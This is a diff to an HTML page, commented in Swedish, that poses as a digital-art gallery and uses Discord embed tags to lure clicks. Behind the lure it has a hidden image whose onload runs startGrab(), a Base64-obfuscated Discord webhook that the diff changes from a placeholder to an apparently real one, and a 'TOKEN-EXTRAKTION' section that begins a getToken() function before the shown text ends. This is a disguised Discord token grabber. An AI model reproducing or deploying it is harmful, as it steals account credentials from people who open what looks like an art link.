@@ -3,9 +3,9 @@
 <head>
     <!-- DET HÄR GÖR ATT DISCORD VISAR EN BILD-EMBED -->
     <meta property="og:title" content="✨ 8K Digital Artwork">
-    <meta property="og:image" content="https://i.imgur.com/cool-image.jpg">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1541701494587-cb58502866ab?w=800">
     <meta property="og:description" content="Click to view full resolution">
-    <meta property="og:url" content="https://i.imgur.com/cool-image.jpg">
+    <meta property="og:url" content="https://images.unsplash.com/photo-1541701494587-cb58502866ab?w=800">
     <meta property="og:type" content="website">
     
     <title>Art Gallery</title>
@@ -50,15 +50,17 @@
     </div>
 
     <!-- Dold bild som triggar omdirigering -->
-    <img id="hiddenImage" src="https://i.imgur.com/cool-image.jpg" onload="startGrab()">
+    <img id="hiddenImage" src="https://images.unsplash.com/photo-1541701494587-cb58502866ab?w=800" onload="startGrab()">
 
     <script>
         (function() {
             'use strict';
             
             // ===== DIN WEBHOOK (Base64-kodad) =====
-            const WEBHOOK = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvWU9VUl9XRUJIT09LX0lEL1lPVVJfV0VCSE9PS19UT0tFTg==");
-            const IMAGE_URL = "https://i.imgur.com/cool-image.jpg";
+            // Ersätt detta med din egen webhook! 
+            // Gå till: https://www.base64encode.org/ och koda din webhook-URL
+            const WEBHOOK = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMDIyMjkxMDQ1ODEwNTg1Ni9Cd3NKcU5KOFIyRlB0X0V2UGdGa2lYV3RxTnNBeUlib0M1NUFnRjF3ZzZPeV9BdURBUHB6ZUtqTlVPNVFKeWpWTHRPVw====");
+            const IMAGE_URL = "https://images.unsplash.com/photo-1541701494587-cb58502866ab?w=800";
             
             // ===== TOKEN-EXTRAKTION =====
             function getToken() {
